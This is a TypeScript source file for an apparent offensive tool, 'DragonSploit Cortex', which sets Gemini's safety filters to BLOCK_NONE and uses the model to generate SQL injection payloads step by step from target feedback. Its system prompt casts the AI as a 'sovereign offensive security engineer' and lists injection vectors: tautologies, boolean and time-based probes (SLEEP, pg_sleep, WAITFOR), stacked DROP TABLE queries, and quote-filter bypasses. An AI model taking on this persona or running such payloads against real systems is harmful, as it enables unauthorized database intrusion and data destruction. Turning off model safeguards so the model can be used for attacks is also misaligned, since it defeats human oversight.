import { GoogleGenerativeAI, HarmCategory, HarmBlockThreshold, ChatSession } from "@google/generative-ai";

// ============================================================================
// 🏛️ GOOGLE-SCALE CONFIGURATION
// ============================================================================

if (!process.env.GEMINI_API_KEY) {
    throw new Error("🚨 FATAL: GEMINI_API_KEY is missing. The brain cannot function.");
}

const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
const MODEL_NAME = "gemini-2.5-flash"; 

console.log(`\n🧠 ==================================================`);
console.log(`🧠 DragonSploit Cortex v4.1 (Rate-Limited Edition)`);
console.log(`🧠 Model: ${MODEL_NAME} | Protection: Global Traffic Cop`);
console.log(`🧠 ==================================================\n`);

const safetySettings = [
    { category: HarmCategory.HARM_CATEGORY_HARASSMENT, threshold: HarmBlockThreshold.BLOCK_NONE },
    { category: HarmCategory.HARM_CATEGORY_HATE_SPEECH, threshold: HarmBlockThreshold.BLOCK_NONE },
    { category: HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT, threshold: HarmBlockThreshold.BLOCK_NONE },
    { category: HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT, threshold: HarmBlockThreshold.BLOCK_NONE },
];

const SYSTEM_INSTRUCTION = `
    IDENTITY: You are the "DragonSploit Cortex", a sovereign AI offensive security engineer.
    MISSION: Execute surgical SQL Injection attacks with minimal attempts.

    THE "TITANIUM" DOCTRINE (STRICT ADHERENCE REQUIRED):
    1. OUTPUT FORMAT: Pure JSON only. No markdown. {"payload": "...", "reasoning": "...", "finished": boolean}
    2. SILENT TARGET PROTOCOL: If 'Status=200' and 'Error=None' persist for >2 attempts, ABANDON Syntax-Based attacks. DEPLOY Time-Based payloads (SLEEP/DELAY) immediately.
    3. CONTEXT ADAPTATION: Analyze the feedback. If a quote (') is filtered, try hex encoding (0x27) or char() bypasses.
    4. FAIL-FAST: If 5 attempts yield no variance, verify target stability before quitting.

    ATTACK VECTORS PRIORITY:
    1. Polyglot Probes: 1' OR '1'='1
    2. Boolean Inference: AND 1=1 vs AND 1=2
    3. Temporal Analysis: SLEEP(5) (MySQL), pg_sleep(5) (Postgres), WAITFOR DELAY '0:0:5' (MSSQL)
    4. Stacked Queries: ; DROP TABLE (Use with extreme caution)
`;

// ============================================================================
// 🚦 GLOBAL RATE LIMITER (The Traffic Cop)
// ============================================================================

// متغير لتتبع وقت آخر طلب تم إرساله على مستوى التطبيق بالكامل
let lastRequestTimestamp = 0;
// الحد الأدنى للفاصل الزمني (5000 مللي ثانية = 5 ثوانٍ)
// هذا يعني أقصى سرعة هي 12 طلب في الدقيقة، وهو آمن للخطة المجانية (التي تسمح بـ 15).
const MIN_REQUEST_INTERVAL = 5000; 

/**
 * دالة تضمن عدم إرسال أي طلب قبل مرور الوقت المسموح.
 */
async function enforceRateLimit() {
    const now = Date.now();
    const timeSinceLastRequest = now - lastRequestTimestamp;

    if (timeSinceLastRequest < MIN_REQUEST_INTERVAL) {
        const waitTime = MIN_REQUEST_INTERVAL - timeSinceLastRequest;
        // لا داعي لطباعة رسالة انتظار لكل مرة لتجنب إزعاج اللوج، لكن الانتظار يحدث فعلياً
        await new Promise(resolve => setTimeout(resolve, waitTime));
    }
    
    lastRequestTimestamp = Date.now();
}

// ============================================================================
// 🧠 THE CORTEX ENGINE
// ============================================================================

export function startSqliExploitationChat(): ChatSession {
    return genAI.getGenerativeModel({ model: MODEL_NAME }).startChat();
}

export async function getNextSqlPayload(chat: ChatSession, feedback: string): Promise<{ payload: string | null; reasoning: string; finished: boolean }> {
    const logFeedback = feedback.length > 120 ? feedback.substring(0, 120) + "..." : feedback;
    console.log(`[Cortex] 📥 Analyzing: "${logFeedback}"`);

    const MAX_RETRIES = 5; // زيادة المحاولات قليلاً
    let attempt = 0;

    while (attempt < MAX_RETRIES) {
        try {
            // 🛑 Stop! Traffic Cop Check 🛑
            // لن يمر هذا السطر إلا بعد التأكد من مرور 5 ثوانٍ منذ آخر طلب
            await enforceRateLimit();

            const dynamicTemperature = 0.1 + (attempt * 0.15);
            
            const model = genAI.getGenerativeModel({ 
                model: MODEL_NAME,
                safetySettings,
                systemInstruction: { role: "system", parts: [{ text: SYSTEM_INSTRUCTION }] } 
            });

            const result = await model.generateContent({
                contents: [{ role: "user", parts: [{ text: `STATUS REPORT:\n${feedback}\n\nTASK: Generate the single most effective NEXT payload JSON.` }] }],
                generationConfig: { 
                    responseMimeType: "application/json",
                    maxOutputTokens: 512,
                    temperature: dynamicTemperature 
                }
            });

            const responseText = result.response.text();
            if (!responseText) throw new Error("Empty Neural Response");

            const responseJson = JSON.parse(responseText);

            if (!responseJson.payload || responseJson.payload.trim() === "") {
                throw new Error("AI generated a null payload");
            }

            return {
                payload: responseJson.payload,
                reasoning: responseJson.reasoning || "Calculated via Cortex Algorithms.",
                finished: responseJson.finished || false,
            };

        } catch (error: any) {
            attempt++;
            const msg = error.message || '';
            
            if (msg.includes('429') || msg.includes('503')) {
                // إذا حدث خطأ 429 رغم الـ Rate Limiter، ننتظر وقتاً أطول بكثير
                const backoff = Math.pow(2, attempt) * 2000 + Math.random() * 1000;
                console.warn(`[Cortex] ⏳ API Limit Hit. Cooling down for ${(backoff/1000).toFixed(1)}s...`);
                await new Promise(resolve => setTimeout(resolve, backoff));
            } else if (msg.includes('JSON')) {
                console.warn(`[Cortex] ⚠️ JSON Error. Retrying...`);
            } else {
                if (attempt >= MAX_RETRIES) {
                    console.error(`[Cortex] 💀 SYSTEM FAILURE: Neural Link Severed.`);
                    return { payload: null, reasoning: "System Critical Failure", finished: true };
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }

    return { payload: null, reasoning: "Tactical Retreat (Retries Exhausted)", finished: true };
}